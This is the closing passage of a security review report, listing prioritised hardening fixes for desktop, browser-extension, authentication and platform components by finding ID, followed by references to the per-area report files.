10. **M-7 / L-14 / L-15 / L-16** Desktop hardening pass: drop `script-src 'unsafe-inline'`, enable `sandbox`, disable `runAsNode`, validate IPC `senderFrame`.

**Then (Low / hygiene):**
11. Auth hardening: L-1 (uniform locked response), L-2 (step-up re-auth), L-4 (bcrypt cost + pepper), L-5 (stop logging `deviceId`), L-6 (absolute session cap).
12. Remove the CSRF migration bypass and fix the stale comment (L-3).
13. Complete the AES-CBC→GCM token migration and delete the legacy path (L-10); encapsulate credential encryption at the DB boundary (L-11).
14. Extension: move the JWT off `chrome.storage.sync` (L-19), narrow `web_accessible_resources` (L-18), add `event.source` check (L-20).
15. geo-ip: constant-time Basic-Auth compare + rate limit (L-21), cap the IP array (L-22).
16. Platform: confirm the Cloudflare hop count for `trust proxy` (L-23), tighten error messages (L-13), and the CSP `style-src`/Canvas/COOP items.

---

*Full per-lane reports (with additional trace detail) are retained in the review scratchpad: `sec-auth-core.md`, `sec-federated-identity.md`, `sec-api-authz.md`, `sec-db-injection.md`, `sec-desktop-electron.md`, `sec-web-extension.md`, `sec-platform-config.md`.*
